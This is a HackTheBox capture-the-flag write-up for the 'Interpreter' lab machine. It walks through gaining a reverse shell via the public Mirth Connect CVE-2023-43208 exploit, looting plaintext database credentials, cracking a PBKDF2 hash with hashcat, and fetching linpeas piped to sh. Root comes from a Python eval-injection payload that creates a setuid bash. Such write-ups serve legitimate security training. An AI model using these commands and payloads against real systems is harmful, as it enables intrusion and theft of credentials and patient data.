---
title: HackTheBox | Interpreter
date: 2026-05-02
description: Interpreter is a Medium-difficulty Linux machine.
published: true
categories:
  - CTF
  - HackTheBox
tags:
  - HackTheBox
  - linux
  - mirth-connect
  - cve-2023-43208
  - remote-code-execution
  - mariadb
  - hashcat
  - pbkdf2
  - password-reuse
  - flask
  - python-eval-injection
  - command-injection
  - privilege-escalation
image:
  path: /assets/inter.jpg
---

## Interpreter - Linux

**Difficulty:** Medium
**OS:** Linux


## Enumeration

First move, as always, a full port scan to see what we're dealing with.

```shell
sudo nmap -p- 10.129.2.86 --min-rate 10000

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
6661/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
```

Followed by a version scan on those four ports.

```shell
sudo nmap -sC -sV 10.129.2.86

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
443/tcp open  ssl/http Jetty
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, two HTTP services both pointing at something called "Mirth Connect Administrator," and a mystery port at 6661 I left alone for now. The name on that login page is the interesting bit.

## Poking at Port 80

A quick `whatweb` run confirms what nmap already hinted at.

```shell
whatweb http://10.129.2.86/
http://10.129.2.86 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.129.2.86], JQuery[3.5.1], Title[Mirth Connect Administrator], X-UA-Compatible[IE=edge]
```

Browsing to the site itself confirms it, a Mirth Connect Administrator login page.

- [https://10.129.2.86/](https://10.129.2.86/)

Mirth Connect is a healthcare integration engine, middleware that shuffles patient data between hospital systems. It's the kind of software that's rarely internet-facing outside a lab environment, but this is a lab. Clicking through to launch the admin client and grabbing the `webstart.jnlp` file it downloads gives away exactly which version is running.

```shell
cat webstart.jnlp

<jnlp codebase="http://10.129.2.86:80" version="4.4.0">
    <information>
        <title>Mirth Connect Administrator 4.4.0</title>
        <vendor>NextGen Healthcare</vendor>
        ...
```

Version 4.4.0. That number rang a bell.

## Getting a Shell via CVE-2023-43208

Mirth Connect 4.4.0 has a well documented unauthenticated RCE, tracked as CVE-2023-43208. A handful of writeups and a working exploit already exist for it, so there was no reason to build anything from scratch.

- [Horizon3.ai writeup](https://horizon3.ai/attack-research/attack-blogs/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/)
- [NVD entry](https://nvd.nist.gov/vuln/detail/cve-2023-43208)
- [Public exploit on GitHub](https://github.com/gotr00t0day/NextGen-Mirth-Connect-Exploit)

I grabbed the exploit and pointed it at the target.

```shell
python3 mirthconnect_exploit.py -t 10.129.2.86 -p 443 -lh 10.10.16.69 -lp 4444 --exploit

[+] Found Mirth Connect Administrator:  https://10.129.2.86 4.4.0
Exploit launched......
Check your reverse shell at 10.10.16.69 4444!!!
```

Within a second or two, a connection landed on my listener.

```shell
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.69] from (UNKNOWN) [10.129.2.86] 60754
```

Upgraded it to a proper interactive shell the usual way.

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export XTERM=xterm

mirth@interpreter:/usr/local/mirthconnect$
```

Foothold secured as `mirth`.

## Looking Around as mirth

Standard first checks, who else lives on this box.

```shell
cat /etc/passwd

...
sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash
mirth:x:103:111::/nonexistent:/usr/sbin/nologin
mysql:x:104:112:MySQL Server,,,:/nonexistent:/bin/false
...
```

Only one real user account worth noting, `sedric`.

Environment variables didn't reveal anything useful, so next I checked which services were only listening locally, since those are usually the interesting ones.

```shell
ss -tulpn

tcp   LISTEN 0      128        127.0.0.1:54321      0.0.0.0:*
tcp   LISTEN 0      50           0.0.0.0:80         0.0.0.0:*    users:(("java",pid=3517,fd=327))
tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*
tcp   LISTEN 0      50           0.0.0.0:443        0.0.0.0:*    users:(("java",pid=3517,fd=331))
tcp   LISTEN 0      256          0.0.0.0:6661       0.0.0.0:*    users:(("java",pid=3517,fd=335))
```

Two things caught my eye. A MariaDB instance on 3306, only reachable locally, and something unidentified on 54321 that I filed away for later, since that ended up being the key to root.

Mirth Connect's own config directory was worth reading closely. Inside `mirth.properties` sat the database credentials in plain text.

```shell
cat mirth.properties

database = mysql
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.driver = org.mariadb.jdbc.Driver
database.username = mirthdb
database.password = MirthPass123!
```

| Database Username | Database Password | Database    |
| ------------------ | ------------------ | ----------- |
| mirthdb            | MirthPass123!      | mc_bdd_prod |

Storing plaintext DB credentials in a properties file isn't unusual for this kind of software, but it's a gift when you're on the other side of it.

## Finding a Password in MariaDB

With working credentials, logging into the database was the obvious next step.

```shell
mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod

Welcome to the MariaDB monitor.
MariaDB [mc_bdd_prod]>
```

Listing tables, a couple of names stood out right away.

```shell
show tables;

+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
...
```

`PERSON` and `PERSON_PASSWORD` are exactly what they sound like. Checking `PERSON` first confirmed the username already spotted in `/etc/passwd`.

```shell
select * from PERSON \G;

USERNAME: sedric
...
```

And `PERSON_PASSWORD` had a stored hash for that exact user.

```shell
select * from PERSON_PASSWORD \G;

PERSON_ID: 2
PASSWORD: u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

## Cracking the Hash

Before throwing this at hashcat blindly, I wanted to understand its shape. Decoding the base64 string and splitting it out by hand.

```shell
python3 -c "
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
print(f'Length: {len(data)} bytes')
salt = data[:8]
hash_part = data[8:]
print(f'Salt ({len(salt)}b): {salt.hex()}')
print(f'Hash ({len(hash_part)}b): {hash_part.hex()}')
"

Length: 40 bytes
Salt (8b): bbff8b0413949da7
Hash (32b): 62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```

Eight bytes of salt followed by a thirty two byte hash lines up with PBKDF2-HMAC-SHA256, which is hashcat mode 10900. Reformatted it into the syntax hashcat expects.

```shell
python3 -c "
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt = data[:8]
hash_part = data[8:]
print(f'sha256:600000:{base64.b64encode(salt).decode()}:{base64.b64encode(hash_part).decode()}')
"

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

600,000 iterations is fairly heavy, so this was never going to be fast, but rockyou.txt is always worth a shot before reaching for anything smarter.

```shell
hashcat -m 10900 sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps= /usr/share/wordlists/rockyou.txt

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

A few minutes later, out popped `snowflake1`.

| Password   |
| ---------- |
| snowflake1 |

That was enough to SSH in as `sedric` directly.

```shell
ssh sedric@10.129.2.86

sedric@10.129.2.86's password:
Last login: Sat Feb 21 15:27:09 2026 from 10.10.16.69
sedric@interpreter:~$
```

## user.txt

```shell
sedric@interpreter:~$ cat user.txt
```

## Digging Around as sedric

A quick `id` to confirm who we are.

```shell
id
uid=1000(sedric) gid=1000(sedric) groups=1000(sedric)
```

The home directory had a few things symlinked to `/dev/null`, `.bash_history`, `.mysql_history`, `.python_history`, `.viminfo`, all pointed at the void. Someone clearly didn't want their command history lingering around. Interesting, but not immediately useful.

`sudo -l` was a dead end.

```shell
sudo -l
-bash: sudo: command not found
```

So I brought over `linpeas.sh` for a wider sweep.

```shell
wget http://10.10.16.69/linpeas.sh | sh
chmod +x linpeas.sh
./linpeas.sh
```

Buried in the process list was the payoff, a Python process running as root.

```shell
root  3518  0.0  0.7  39872 31128 ?  Ss  14:01  0:01 /usr/bin/python3 /usr/local/bin/notif.py
```

That matches the mystery port I flagged earlier, 54321. Reading the script itself confirmed it.

```shell
cat /usr/local/bin/notif.py

from flask import Flask, request, abort
...

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    ...
```

It's a small internal service that only accepts requests from localhost, taking patient data as XML and writing out a formatted notification. The developer tried to sanitize input with a regex, which actually does a decent job blocking most special characters. But the regex allows curly braces, parentheses, quotes and underscores, exactly what's needed to break out of an f-string. And the notification text is built with an f-string that then gets fed straight into `eval()`. Whatever ends up inside `{}` in that string runs as Python code, as root.

## Root via a Careless eval()

The plan was simple once I saw it. Get something into the `firstname` field that, when interpreted inside `{}`, runs a shell command. First I prepped a tiny script to make a setuid copy of bash.

```shell
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /tmp/pwn.sh
chmod +x /tmp/pwn.sh
```

Then I built an XML payload where the `firstname` field calls `os.system()` on that script through the eval injection.

```shell
python3 -c "
import urllib.request
data = b'''<patient>
  <firstname>{__import__(\"os\").system(\"/tmp/pwn.sh\")}</firstname>
  <lastname>A</lastname>
  <sender_app>A</sender_app>
  <timestamp>A</timestamp>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>'''
req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=data, headers={'Content-Type':'application/xml'})
print(urllib.request.urlopen(req).read())
"

b'Patient 0 A (M), 36 years old, received from A at A'
```

The app happily processed it, and checking `/tmp` confirmed the setuid binary was there, owned by root.

```shell
ls -la /tmp

-rwxr-xr-x  1 sedric sedric      54 Feb 21 15:34 pwn.sh
-rwsr-xr-x  1 root   root   1265648 Feb 21 15:34 rootbash
```

That `s` in the permissions is the whole story. Running it with `-p` to preserve privileges dropped me straight into a root shell.

```shell
/tmp/rootbash -p
rootbash-5.2#
```

## root.txt

```shell
rootbash-5.2# cat root.txt
```
